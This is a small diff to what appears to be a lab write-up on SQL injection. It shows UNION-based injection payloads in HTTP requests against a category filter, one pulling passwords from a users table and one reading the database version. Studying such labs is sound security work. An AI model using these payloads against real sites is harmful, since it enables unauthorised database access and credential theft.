@@ -171,7 +171,7 @@ GET /filter?category=[value]'+UNION+SELECT+NULL,password+FROM+users-- HTTP/1.1
 
 **Attack Payload:**
 ```http
-GET /filter?category=[value]'+UNION+SELECT+NULL,version()-- HTTP/1.1
+GET /filter?category=[value]'+UNION+SELECT+NULL,version() from users-- HTTP/1.1
 ```
 <img width="1920" height="982" alt="LAB2_ss7" src="https://github.com/user-attachments/assets/2c5114f9-e6b9-47e4-aa9e-067e1eac1df3" />
 
